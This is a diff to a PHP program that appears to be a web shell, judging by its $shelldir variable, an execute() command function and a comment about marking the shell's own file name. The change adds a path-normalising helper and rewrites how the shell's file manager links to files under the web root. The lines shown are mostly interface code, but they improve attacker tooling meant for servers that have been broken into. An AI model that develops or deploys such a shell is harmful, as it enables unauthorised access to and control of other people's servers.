@@ -252,6 +252,10 @@ function hsc($s){
 	return htmlentities($s);
 }
 
+function fixRoute($s){
+	return str_replace(array('/', '\\'), DS, $s);
+}
+
 function execute($c, $i = false){
     $v = '';
     $r = '';
@@ -1996,7 +2000,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
         // Obtenemos el directorio en el que estamos
 		$currentdir = $shelldir;
         if (!empty($p['dir'])){
-			$p['dir'] = str_replace(array('/', '\\'), DS, $p['dir']);
+			$p['dir'] = fixRoute($p['dir']);
 			if (substr($p['dir'], -1) !== DS) $p['dir'] = $p['dir'] . DS;
 			$currentdir = $p['dir'];
 		}
@@ -2125,7 +2129,11 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			<td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
 			</tr></thead>
 			<tbody>';
-					
+			
+			$drf = fixRoute($_SERVER['DOCUMENT_ROOT']);
+			$baseURL = str_replace(DS, '/', str_replace($drf, '', $currentdir));
+			$isLinked = strncasecmp($drf, $currentdir, strlen($_SERVER['DOCUMENT_ROOT'])) === 0 ? true : false;
+			
 			$bg = 2;
 			foreach ($dirdata as $file){
                 $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
@@ -2148,11 +2156,9 @@ if (isset($p['me']) && $p['me'] === 'file'){
                 $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td width="2%"><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';
 
-                //mark shell name in yellow
                 if ($currentdir . $file === __file__) $sBuff .= '<div class="image php"></div><font class="my">' . $file . '</font>';
-                else $sBuff .= showIcon($file) . ' <a href="' . str_replace(SROOT, '', $file) . '" target="_blank">' . $file . '</a>';
-				//$_SERVER['DOCUMENT_ROOT']
-				//uso esa variable para saber si corresponde o no el link al archivo
+                elseif($isLinked) $sBuff .= showIcon($file) . ' <a href="' . $baseURL . $file . '" target="_blank">' . $file . '</a>';
+                else $sBuff .= showIcon($file) . ' ' . $file . '</a>';
                
 			   $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
 							<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
